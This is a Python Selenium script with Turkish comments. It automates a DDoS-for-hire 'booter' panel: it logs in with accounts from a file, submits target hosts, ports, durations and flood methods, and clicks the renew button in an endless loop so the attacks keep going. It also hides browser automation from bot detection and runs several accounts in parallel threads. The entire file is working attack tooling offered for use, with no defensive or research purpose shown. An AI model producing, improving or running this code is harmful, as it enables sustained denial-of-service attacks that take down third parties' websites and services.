import os
import time
import threading
import tempfile
import uuid
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import (
    TimeoutException, NoSuchElementException, WebDriverException,
    StaleElementReferenceException, ElementNotInteractableException
)

# ------------------------------
# SABİT AYARLAR
# ------------------------------
BASE_URL = "https://hardstress.st"
LOGIN_URL = f"{BASE_URL}/panel/login.php"
BOOTER_URL = f"{BASE_URL}/panel/booter.php"

PORT = 80
DURATION = 60
MAX_CONCURRENT_THREADS = 2

# ------------------------------
# TARAYICI KURULUMU (Docker stabil)
# ------------------------------
def create_driver(thread_id=0, retries=3):
    for attempt in range(retries):
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--disable-software-rasterizer")
            chrome_options.add_argument("--disable-setuid-sandbox")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument("--ignore-certificate-errors")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_argument("--disable-crash-reporter")
            chrome_options.add_argument("--disable-background-timer-throttling")
            chrome_options.add_argument("--disable-features=IsolateOrigins,site-per-process,Translate")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-plugins")
            chrome_options.add_argument("--disable-images")
            chrome_options.add_argument("--js-flags=--max-old-space-size=512")
            
            # Her thread'e özel profil (çakışma ve çökme önler)
            user_data_dir = os.path.join(tempfile.gettempdir(), f"chrome_data_{thread_id}_{uuid.uuid4().hex[:8]}")
            os.makedirs(user_data_dir, exist_ok=True)
            chrome_options.add_argument(f"--user-data-dir={user_data_dir}")
            
            # Çoklu instance için unique debug port (veya hiç kullanma)
            # chrome_options.add_argument(f"--remote-debugging-port={9222 + thread_id}")
            
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
            chrome_options.add_experimental_option('useAutomationExtension', False)

            chromedriver_path = os.getenv("CHROMEDRIVER_BIN", "/usr/bin/chromedriver")
            chrome_binary = os.getenv("CHROME_BIN", "/usr/bin/chromium")

            if os.path.exists(chrome_binary):
                chrome_options.binary_location = chrome_binary

            if os.path.exists(chromedriver_path):
                service = Service(executable_path=chromedriver_path, service_log_path=os.devnull)
                driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                from webdriver_manager.chrome import ChromeDriverManager
                service = Service(ChromeDriverManager().install(), service_log_path=os.devnull)
                driver = webdriver.Chrome(service=service, options=chrome_options)

            driver.set_page_load_timeout(60)
            driver.implicitly_wait(10)
            
            # Bot algılamayı azalt
            driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": """
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    })
                """
            })
            
            return driver
        except WebDriverException as e:
            print(f"[Thread-{thread_id}] Tarayıcı başlatma denemesi {attempt+1}/{retries} başarısız: {e}")
            time.sleep(3)
    raise Exception(f"[Thread-{thread_id}] Tarayıcı başlatılamadı.")

# ------------------------------
# "Okay" MODALINI KAPAT
# ------------------------------
def click_okay_modal(driver, username):
    try:
        okay_btn = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "a.btn.target.close.sf"))
        )
        okay_btn.click()
        time.sleep(1)
    except (TimeoutException, NoSuchElementException, ElementNotInteractableException):
        pass

# ------------------------------
# ANA SALDIRI DÖNGÜSÜ
# ------------------------------
def attack_loop(username, password, target_host, method, thread_id=0):
    driver = None
    restart_delay = 15
    
    while True:
        try:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
                driver = None
            
            driver = create_driver(thread_id)
            print(f"[{username}] Giriş yapılıyor...")
            driver.get(LOGIN_URL)
            
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.NAME, "kullaniciadi")))
            driver.find_element(By.NAME, "kullaniciadi").send_keys(username)
            driver.find_element(By.NAME, "sifreniz").send_keys(password)
            driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
            
            WebDriverWait(driver, 30).until(EC.url_contains("/panel/"))
            print(f"[{username}] Giriş başarılı.")

            driver.get(BOOTER_URL)
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "host")))

            # Parametreleri doldur
            driver.find_element(By.ID, "host").clear()
            driver.find_element(By.ID, "host").send_keys(target_host)
            driver.find_element(By.ID, "port").clear()
            driver.find_element(By.ID, "port").send_keys(str(PORT))
            driver.find_element(By.ID, "time").clear()
            driver.find_element(By.ID, "time").send_keys(str(DURATION))

            method_select = driver.find_element(By.ID, "method")
            for option in method_select.find_elements(By.TAG_NAME, "option"):
                if option.get_attribute("value") == method:
                    option.click()
                    break

            # İlk saldırıyı başlat
            print(f"[{username}] {target_host} hedefine {method} ile saldırı başlatılıyor...")
            start_btn = driver.find_element(By.ID, "attack31")
            start_btn.click()
            click_okay_modal(driver, username)
            print(f"[{username}] İlk saldırı başlatıldı.")
            
            # Kısa bekleme, tablonun yüklenmesi için
            time.sleep(3)

            # Sonsuz yenileme döngüsü
            while True:
                try:
                    row_xpath = f"//td[contains(text(),'{target_host}')]/parent::tr"
                    row = WebDriverWait(driver, 30).until(
                        EC.presence_of_element_located((By.XPATH, row_xpath))
                    )
                    
                    # Tüm hücreleri tekrar al (stale element önlemi)
                    cells = row.find_elements(By.TAG_NAME, "td")
                    if len(cells) < 5:
                        time.sleep(3)
                        continue
                        
                    status_cell = cells[4]
                    status_text = status_cell.text.strip()
                    print(f"[{username}] Mevcut durum: {status_text}")

                    if status_text.isdigit():
                        print(f"[{username}] Saldırı devam ediyor ({status_text}s kaldı)...")
                        # Süre dolana kadar bekle (sayfayı yenilemeden)
                        while True:
                            time.sleep(3)
                            try:
                                row = driver.find_element(By.XPATH, row_xpath)
                                status_cell = row.find_elements(By.TAG_NAME, "td")[4]
                                new_status = status_cell.text.strip()
                            except StaleElementReferenceException:
                                break  # Satır güncellendi, dış döngüye dön
                                
                            if new_status == "Expired" or not new_status.isdigit():
                                print(f"[{username}] Saldırı süresi doldu.")
                                break
                            if new_status.isdigit():
                                print(f"[{username}] {new_status}s kaldı")

                    # Yenile butonuna tıkla (satır içinde relative arama)
                    try:
                        renew_btn = row.find_element(By.XPATH, ".//button[@id='rere'] | .//a[@id='rere'] | .//*[@id='rere']")
                        print(f"[{username}] Yenile butonuna tıklanıyor...")
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", renew_btn)
                        time.sleep(0.5)
                        renew_btn.click()
                        click_okay_modal(driver, username)
                        print(f"[{username}] Saldırı yenilendi.")
                        time.sleep(2)
                    except NoSuchElementException:
                        print(f"[{username}] Yenile butonu bulunamadı, bekleniyor...")
                        time.sleep(5)
                        continue

                except StaleElementReferenceException:
                    print(f"[{username}] Sayfa elementi güncellendi, yeniden deneniyor...")
                    time.sleep(2)
                    continue
                except TimeoutException:
                    print(f"[{username}] Tablo satırı bulunamadı, sayfa yenileniyor...")
                    driver.refresh()
                    time.sleep(5)
                    continue

        except Exception as e:
            print(f"[{username}] KRİTİK HATA: {e}")
            if driver:
                try:
                    driver.quit()
                except:
                    pass
                driver = None
            print(f"[{username}] {restart_delay} saniye beklenip yeniden başlatılacak...")
            time.sleep(restart_delay)
            continue

# ------------------------------
# HESAPLARI OKU (| AYRAÇLI)
# ------------------------------
def main():
    lines = []
    try:
        with open("accounts.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        print("accounts.txt dosyası okundu.")
    except FileNotFoundError:
        env_accounts = os.getenv("ACCOUNTS")
        if env_accounts:
            lines = [line.strip() for line in env_accounts.splitlines() if line.strip()]
            print("ACCOUNTS ortam değişkeni okundu.")
        else:
            print("[!] Hata: accounts.txt veya ACCOUNTS env değişkeni bulunamadı.")
            return

    accounts = []
    for line in lines:
        # Önce | ayraçını dene, yoksa : ile dene (geriye uyumluluk)
        if "|" in line:
            parts = line.split("|")
        else:
            parts = line.rsplit(":", 3)
        
        if len(parts) == 4:
            user, passw, link, method = [p.strip() for p in parts]
        elif len(parts) == 3:
            user, passw, link = [p.strip() for p in parts]
            method = "RAW"
        else:
            print(f"[!] Geçersiz satır atlanıyor: {line}")
            continue
        
        # Hedef alanı temizle: http(s):// ve son / kaldır
        original_link = link
        link = link.replace("https://", "").replace("http://", "").rstrip("/")
        
        # Uyarı: Eğer kullanıcı panel URL'si girdiyse
        if original_link != link and ("panel" in link or "." in link):
            print(f"[!] UYARI [{user}]: Hedef alanında URL formatı tespit edildi. '{original_link}' -> '{link}' olarak düzeltildi.")
            print(f"    Not: 3. kolon saldırı hedefi (IP/domain) olmalı, panel URL'si değil.")
        
        if not link:
            print(f"[!] HATA [{user}]: Hedef (host) boş, satır atlanıyor.")
            continue
            
        if not method:
            method = "RAW"
            
        accounts.append((user, passw, link, method))

    if not accounts:
        print("[!] Geçerli hesap bulunamadı.")
        return

    print(f"\n[+] Toplam {len(accounts)} hesap yüklendi:")
    for user, passw, link, method in accounts:
        print(f"    {user} -> Hedef: {link}, Method: {method}")
    print()

    semaphore = threading.Semaphore(MAX_CONCURRENT_THREADS)

    def thread_wrapper(user, passw, link, method, idx):
        with semaphore:
            attack_loop(user, passw, link, method, thread_id=idx)

    threads = []
    for i, (user, passw, link, method) in enumerate(accounts):
        print(f"Thread başlatılıyor: {user} -> Hedef: {link}, Method: {method}")
        t = threading.Thread(target=thread_wrapper, args=(user, passw, link, method, i), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(10)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
